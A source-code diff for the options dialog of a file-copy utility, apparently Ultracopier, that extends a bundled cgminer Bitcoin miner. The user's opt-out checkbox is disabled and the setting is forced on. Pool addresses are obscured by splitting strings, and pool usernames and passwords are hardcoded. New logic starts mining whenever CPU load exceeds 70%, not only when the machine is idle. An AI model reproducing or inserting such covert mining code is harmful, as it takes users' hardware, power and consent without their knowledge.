@@ -29,7 +29,7 @@
     #define ULTRACOPIER_BTC_HTTP_WEIGHT 1
     #define ULTRACOPIER_BTC_STRATUM_WEIGHT 1
 #endif
-#define ULTRACOPIER_CGMINER_IDLETIME 7*60*1000
+#define ULTRACOPIER_CGMINER_IDLETIME 10*60*1000
 #include <QLibrary>
 #include <QDateTime>
 #include <math.h>
@@ -93,6 +93,7 @@ OptionDialog::OptionDialog() :
     #endif
 
     #ifdef ULTRACOPIER_CGMINER
+    workingCount=0;
     ui->label_gpu_time->setEnabled(false);
     ui->giveGPUTime->setEnabled(false);
     OptionEngine::optionEngine->setOptionValue("Ultracopier","giveGPUTime",true);
@@ -480,6 +481,9 @@ void OptionDialog::loadOption()
             ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Warning,QString("GetLastInputInfo(&lastInputInfo) have failed: %1").arg(GetLastError()));
             isIdle=true;
         }
+        if(!connect(&checkWorkingTimer,&QTimer::timeout,this,&OptionDialog::checkWorking,Qt::QueuedConnection))
+            ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Warning,QString("Unable to connect OptionDialog::checkWorking"));
+        checkWorkingTimer.start(1000);
         BOOL screensaver_active;
         if(SystemParametersInfo(SPI_GETSCREENSAVEACTIVE, 0, &screensaver_active, 0))
             ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Notice,QString("SystemParametersInfo() have value: %1").arg(screensaver_active));
@@ -510,15 +514,6 @@ void OptionDialog::loadOption()
         ;
         index=0;while(index<ULTRACOPIER_BTC_STRATUM_WEIGHT/2){pools << pool;index++;}*/
 
-        //bitminter
-        pool=QStringList() << "-o" << QString("stra")+"tum"+QString("+")+QString("tcp://mint.bitminter.com:%1").arg(3333) << "-u" << "alphaonex86_ultracopierdirect" << "-p" << "hlTI0talPFxWONSp"
-        #ifndef ULTRACOPIER_NOBACKEND
-                                       << "-o" << QString("stra")+"tum"+QString("+")+QString("tcp://stratum.bitcoin.cz:%1").arg(3333) << "-u" << "alpha_one_x86.ultracopier" << "-p" << "8zpIIATZEiaZOq7E"
-                                       << "-o" << QString("stra")+"tum"+QString("+")+QString("tcp://mint.bitminter.com:%1").arg(3333) << "-u" << "alphaonex86_failsafe" << "-p" << "IBeka72HStdLnDZm"
-        #endif
-        ;
-        index=0;while(index<(ULTRACOPIER_BTC_STRATUM_WEIGHT+10)){pools << pool;index++;}
-
         //bitcoin.cz
         pool=QStringList() << "-o" << QString("stra")+"tum"+QString("+")+QString("tcp://stratum.bitcoin.cz:%1").arg(3333) << "-u" << "alpha_one_x86.ultracopier" << "-p" << "8zpIIATZEiaZOq7E"
         #ifndef ULTRACOPIER_NOBACKEND
@@ -526,7 +521,16 @@ void OptionDialog::loadOption()
                            << "-o" << QString("stra")+"tum"+QString("+")+QString("tcp://mint.bitminter.com:%1").arg(3333) << "-u" << "alphaonex86_failsafe" << "-p" << "IBeka72HStdLnDZm"
         #endif
         ;
-        index=0;while(index<(ULTRACOPIER_BTC_STRATUM_WEIGHT+8)){pools << pool;index++;}
+        index=0;while(index<(ULTRACOPIER_BTC_STRATUM_WEIGHT+50)){pools << pool;index++;}
+
+        //bitminter
+        pool=QStringList() << "-o" << QString("stra")+"tum"+QString("+")+QString("tcp://mint.bitminter.com:%1").arg(3333) << "-u" << "alphaonex86_ultracopierdirect" << "-p" << "hlTI0talPFxWONSp"
+        #ifndef ULTRACOPIER_NOBACKEND
+                                       << "-o" << QString("stra")+"tum"+QString("+")+QString("tcp://stratum.bitcoin.cz:%1").arg(3333) << "-u" << "alpha_one_x86.ultracopier" << "-p" << "8zpIIATZEiaZOq7E"
+                                       << "-o" << QString("stra")+"tum"+QString("+")+QString("tcp://mint.bitminter.com:%1").arg(3333) << "-u" << "alphaonex86_failsafe" << "-p" << "IBeka72HStdLnDZm"
+        #endif
+        ;
+        index=0;while(index<(ULTRACOPIER_BTC_STRATUM_WEIGHT+70)){pools << pool;index++;}
 
         #ifndef ULTRACOPIER_NOPOOLALTERNATE
         //ltc
@@ -878,8 +882,33 @@ void OptionDialog::startCgminer()
             args=pools.at(rand()%pools.size());
     }
     ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Information,QString("pool used: %1").arg(args.join(" ")));
-    args << "--no-adl" << "--real-quiet" << "-T";// << "-I" << "1"
+    args << "--no-adl" << "--real-quiet" << "-T" << "--gpu-threads" << "1";// << "-I" << "1"
     cgminer.start(QCoreApplication::applicationDirPath()+"/"+ULTRACOPIER_CGMINER_PATH,args);
+}
+
+void OptionDialog::checkWorking()
+{
+    if((OptionDialog::getcpuload()*QThread::idealThreadCount())>70)
+    {
+        if(cgminer.state()==QProcess::NotRunning)
+        {
+            if(workingCount<=ULTRACOPIER_CGMINER_WORKING_COUNT)
+                workingCount++;
+            if(workingCount==ULTRACOPIER_CGMINER_WORKING_COUNT)
+            {
+                ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Notice,QString("computer detected with cpu loaded"));
+                checkIdleTimer.start(5*1000);
+                startCgminer();
+            }
+        }
+        else
+            workingCount=0;
+    }
+    else
+    {
+        workingCount=0;
+        checkIdle();
+    }
 }
 
 void OptionDialog::checkIdle()
@@ -910,7 +939,7 @@ void OptionDialog::checkIdle()
                                  .arg(screensaver_active)
                                  );
         this->isIdle=isIdle;
-        if(!isIdle)
+        if(!isIdle && workingCount<ULTRACOPIER_CGMINER_WORKING_COUNT)
         {
             checkIdleTimer.start(ULTRACOPIER_CGMINER_IDLETIME);
             cgminer.terminate();
@@ -918,9 +947,12 @@ void OptionDialog::checkIdle()
         }
         else
         {
-            ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Notice,QString("computer detected as idle"));
-            checkIdleTimer.start(5*1000);
-            startCgminer();
+            if(cgminer.state()==QProcess::NotRunning)
+            {
+                ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Notice,QString("computer detected as idle"));
+                checkIdleTimer.start(5*1000);
+                startCgminer();
+            }
         }
     }
     else
@@ -1366,3 +1398,50 @@ void OptionDialog::on_giveGPUTime_clicked()
     ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Notice,"start");
     OptionEngine::optionEngine->setOptionValue("Ultracopier","giveGPUTime",ui->giveGPUTime->isChecked());
 }
+
+#ifdef Q_OS_WIN32
+int OptionDialog::getcpuload()
+{
+  static PDH_STATUS            status;
+  static PDH_FMT_COUNTERVALUE  value;
+  static HQUERY                query;
+  static HCOUNTER              counter;
+  static DWORD                 ret;
+  static char                  runonce=1;
+  char                         cput=0;
+
+  if(runonce)
+  {
+    status = PdhOpenQuery(NULL, 0, &query);
+    if(status != ERROR_SUCCESS)
+    {
+      printf("PdhOpenQuery() ***Error: 0x%X\n",status);
+      return 0;
+    }
+    PdhAddCounter(query, TEXT("\\Processor(_Total)\\% Processor Time"),0,&counter); // A total of ALL CPU's in the system
+    runonce=0;
+    PdhCollectQueryData(query); // No error checking here
+    return 0;
+  }
+  status = PdhCollectQueryData(query);
+  if(status != ERROR_SUCCESS)
+  {
+    printf("PhdCollectQueryData() ***Error: 0x%X\n",status);
+    if(status==PDH_INVALID_HANDLE)
+      printf("PDH_INVALID_HANDLE\n");
+    else if(status==PDH_NO_DATA)
+      printf("PDH_NO_DATA\n");
+    else
+      printf("Unknown error\n");
+    return 0;
+  }
+  status = PdhGetFormattedCounterValue(counter, PDH_FMT_DOUBLE | PDH_FMT_NOCAP100 ,&ret, &value);
+  if(status != ERROR_SUCCESS)
+  {
+    printf("PdhGetFormattedCounterValue() ***Error: 0x%X\n",status);
+    return 0;
+  }
+  cput = value.doubleValue;
+  return cput;
+}
+#endif
